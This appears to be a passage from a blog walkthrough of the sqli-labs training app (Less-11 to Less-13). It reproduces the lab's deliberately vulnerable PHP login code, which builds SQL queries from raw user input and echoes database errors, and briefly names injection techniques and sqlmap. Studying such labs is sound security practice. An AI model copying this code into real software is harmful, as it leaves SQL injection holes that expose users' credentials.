&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT username, password FROM users WHERE username=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$uname&lt;/span&gt;&amp;#x27; and password=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$passwd&lt;/span&gt;&amp;#x27; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;;	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 4&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot; You Have successfully logged in\n\n &amp;quot; ;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot; color=&amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Login name:&amp;#x27;&lt;/span&gt;. &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Password:&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot;  /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size=&amp;quot;3&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;Try again looser&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/slap.jpg&amp;quot; /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;24-sqli-labs-masterless-12&#34;&gt; 24. sqli-labs-master/Less-12&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型联合、报错、布尔、时间&lt;br&gt;
与上一题思路一样，只是变成 &amp;quot;)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$uname&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$uname&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$passwd&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$passwd&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT username, password FROM users WHERE username=(&lt;span class=&#34;subst&#34;&gt;$uname&lt;/span&gt;) and password=(&lt;span class=&#34;subst&#34;&gt;$passwd&lt;/span&gt;) LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;comment&#34;&gt;//echo &amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;;	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot; font size = 4&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot; You Have successfully logged in &amp;quot; ;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot; color=&amp;quot;#0000ff&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Login name:&amp;#x27;&lt;/span&gt;. &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Password:&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/flag.jpg&amp;quot;   /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size=&amp;quot;3&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;//echo &amp;quot;Try again looser&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;img src=&amp;quot;../images/slap.jpg&amp;quot;   /&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;25-sqli-labs-masterless-13sqlmap-布尔没跑出来&#34;&gt; 25. sqli-labs-master/Less-13（sqlmap 布尔没跑出来！！！)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型报错、布尔、时间&lt;br&gt;
额。还是类似，只不过变成’)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT username, password FROM users WHERE username=(&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$uname&lt;/span&gt;&amp;#x27;) and password=(&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$passwd&lt;/span&gt;&amp;#x27;) LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span 